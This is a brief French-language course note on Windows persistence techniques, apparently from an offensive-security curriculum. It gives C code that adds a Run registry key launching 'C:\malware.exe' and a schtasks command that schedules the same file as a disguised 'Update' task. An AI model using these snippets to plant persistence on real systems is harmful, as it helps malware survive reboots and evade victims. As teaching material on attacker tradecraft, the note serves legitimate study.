# Cours : Persistence Windows

## 1. Introduction

**Persistence** = Survivre au redémarrage et rester dans le système.

## 2. Techniques Registry

### 2.1 Run Keys

```c
HKEY hKey;
RegOpenKeyExA(HKEY_CURRENT_USER,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    0, KEY_WRITE, &hKey);

RegSetValueExA(hKey, "MyApp", 0, REG_SZ, 
    (BYTE*)"C:\\malware.exe", strlen("C:\\malware.exe"));
```

**Clés courantes** :
- `HKCU\...\Run` : Démarrage utilisateur
- `HKLM\...\Run` : Démarrage système (admin requis)
- `HKCU\...\RunOnce` : Une seule fois au démarrage

### 2.2 Scheduled Tasks

```bash
schtasks /create /tn "Update" /tr "C:\malware.exe" /sc daily /st 09:00
```

### 2.3 Services Windows

Créer un service qui démarre automatiquement.

## Ressources

- [Windows Persistence](https://attack.mitre.org/tactics/TA0003/)

